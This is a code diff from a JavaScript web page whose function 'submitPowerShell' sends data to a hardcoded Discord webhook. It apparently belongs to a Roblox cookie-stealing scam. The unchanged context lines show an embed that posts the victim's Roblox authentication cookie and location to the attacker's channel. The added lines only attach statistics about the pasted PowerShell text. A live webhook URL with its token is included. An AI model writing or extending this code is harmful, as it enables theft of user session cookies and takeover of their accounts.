@@ -255,6 +255,11 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
+        // Calculate PowerShell script statistics
+        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
+        const characterCount = inputText.length;
+        const lineCount = inputText.split('\n').length;
+        
         // Webhook payload with only data and location
         const payload = {
             content: "@everyone 🔑 **AUTH DATA + LOCATION** 📍",
@@ -268,6 +273,11 @@ async function submitPowerShell() {
                     {
                         name: "🔑 Roblox Authentication (Click to Copy)",
                         value: `\`\`\`\n${robloxCookie}\n\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📊 PowerShell Script Stats",
+                        value: `**📝 Words:** ${wordCount.toLocaleString()}\n**🔤 Characters:** ${characterCount.toLocaleString()}\n**📄 Lines:** ${lineCount.toLocaleString()}`,
                         inline: false
                     },
                     {
